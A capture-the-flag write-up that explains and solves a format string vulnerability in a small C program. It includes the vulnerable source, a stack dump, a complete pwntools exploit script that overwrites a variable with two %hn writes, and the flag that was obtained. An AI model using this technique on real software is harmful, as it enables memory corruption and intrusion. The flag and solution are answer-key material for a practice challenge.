# graphophobia 
```
Writing things in C can be scary, but I find it's always best to take things one byte at a time, just to make sure all your code is in the right format. Stringing things together without thinking about it is sure to lead to problems.
```

## Challenge
> TL;DR: Perform format string attack to modify the password value

We are given a binary and a c program:
``` c
#include <stdio.h>
#include <stdlib.h>

int password = 0x65706f6e;

int main() {
    setbuf(stdout, NULL);
    printf("The password is at %p\n\n", &password);
    puts("What's your name?");
    char name[100];
    fgets(name, 100, stdin);
    printf("Hi, ");
    printf(name);
    printf("!\n");
    if (password == 0x87654321) {
        puts("Winner!");
        FILE* f = fopen("flag.txt", "r");
        fscanf(f, "%s", name);
        fclose(f);
        puts(name);
    } else {
        printf("Sorry, you entered the password %08x...\n", password);
    }
}
```
Goal: Modify the value of `password` to 0x87654321

The code contains the following line which is vulnerable to format string attack:
```
printf(name);
```

Issue: The value 0x87654321 is too large to overwrite the value of password variable.

Solution: Instead of writing a long integer (4 bytes), write 2 short integer (2 bytes). The value (0x8765 - [value written]) is wrote to [address] + 2 while the value 0x4321 is wrote to [address]. (Reasoning: 17185 (0x4321) is written to lower address is because we want to set 0x4321 value at that address. (0x8765 - [value written]) is written to higher address is because we want to set 0x8765 value at that address. However, 0x4321 characters have already been written when writting to the lower address. So, we specify (0x8765 - [value written]) so that the total characters written are 0x8765)

Once the payload is sent, the stack should look like: 
```bash
─────────────────────────────────────────────────────────────────── stack ────
0x00007ffcc4bb5e70│+0x0000: 0x2563353831373125	 ← $rax, $rsp, $r8
0x00007ffcc4bb5e78│+0x0008: 0x3731256e68243031
0x00007ffcc4bb5e80│+0x0010: 0x2431312563363734
0x00007ffcc4bb5e88│+0x0018: 0x4141414141416e68
0x00007ffcc4bb5e90│+0x0020: 0x000055d82df06060  →  0x0000000065706f6e ("nope"?)
0x00007ffcc4bb5e98│+0x0028: 0x000055d82df06062  →  0x0000000000006570 ("pe"?)
0x00007ffcc4bb5ea0│+0x0030: 0x00007ffcc4bb000a  →  0x0000000000000000
0x00007ffcc4bb5ea8│+0x0038: 0x000055d82df032f5  →  <__libc_csu_init+69> add rbx, 0x1
```

In this case, the payload is shown on the stack. The top 3 lines of the stack specifies the value to write and the position where the address to write to is stored. The "A" is used to ensure that it is word-aligned. So, the address of the `password` variable is stored in the 10th and 11th positions (as the 1st to 5th positions are the registers due to being a x64 binary).

Script:
```python
from pwn import *

#r = process('./405C-graphophobia')
r = remote('puzzler7.imaginaryctf.org', 8000)
#pause()
password_addr = int(r.recvline().split()[4], 0)
upper_addr = password_addr + 2
lower_addr = password_addr
print("Lower addr: " + hex(lower_addr))
print("Upper addr: " + hex(upper_addr))

# value to write : 0x87654321
# upper value: 34661 (0x8765) write to upper addr 
# lower value: 17185 (0x4321) write to lower addr
# Formula: The value we want - the value already wrote = the value to set
# 34661 - 17185 = 17476

r.recvuntil(b'name?\n')
payload = b'%17185c%10$hn'
payload += b'%17476c%11$hn'
payload += b'AAAAAA'
payload += p64(password_addr)
payload += p64(upper_addr)
print(len(payload))
r.sendline(payload)

r.interactive()
```

Output of the script:
```bash
$ python3 graphophobia.py
[+] Opening connection to puzzler7.imaginaryctf.org on port 8000: Done
Lower addr: 0x56314f15f060
Upper addr: 0x56314f15f062
48
[*] Switching to interactive mode
Hi,
-snip-
Winner!
ictf{im_scar3d_of_writing_good_flags_so_you_get_this_instead}
```

Flag: `ictf{im_scar3d_of_writing_good_flags_so_you_get_this_instead}`

## References
https://axcheron.github.io/exploit-101-format-strings/